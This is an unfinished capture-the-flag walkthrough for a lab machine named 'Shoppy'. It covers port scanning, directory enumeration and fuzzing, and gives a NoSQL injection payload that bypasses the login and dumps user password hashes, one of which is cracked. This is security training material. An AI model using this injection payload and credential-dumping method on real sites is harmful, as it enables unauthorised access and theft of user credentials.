# SHOPPY WALKTHROUGH

## 1 - Scan ports


command:

```
nmap -sV -sT -sC 10.129.207.108
```
result:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 20:02 -03
Nmap scan report for shoppy.htb (10.129.207.108)
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title:             Shoppy Wait Page        
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2 - Directory enumeration

command:

```
gobuster dir -u http://shoppy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

result:

```
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/20 20:42:13 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]              
/admin                (Status: 302) [Size: 28] [--> /login]   
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/Login                (Status: 200) [Size: 1074]              
/js                   (Status: 301) [Size: 171] [--> /js/]    
/fonts                (Status: 301) [Size: 177] [--> /fonts/] 
/Admin                (Status: 302) [Size: 28] [--> /login]
```


## 2 - Exploit Login page

Nosql injection was used  to this case 

command inside the directory of ffuf after cloned it from github:


```
./ffuf -u http://shoppy.htb/login -c -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -X POST -d 'username=adminFUZZ&password=admin' -H 'Content-Type: application/x-www-form-urlencoded'
```

result:

```
:: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:' || 'a'=='a            [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 453ms]
```

used the payload in the username field 

 ```
admin' || 'a'=='a
```

 and any value in the password field.

## 3 - Exploit search for users page

http://shoppy.htb/admin/search-users

used the same payload in the field search:

 ```
admin' || 'a'=='a
```

it returnd me a json file to download with the following credentials:

```
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

cracked josh password(md5)(https://crackstation.net/): ```remembermethisway```

## 4 - DNS Enumeration ???

command:

```
./ffuf -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.shoppy.htb"
```

result: didn`t work =/
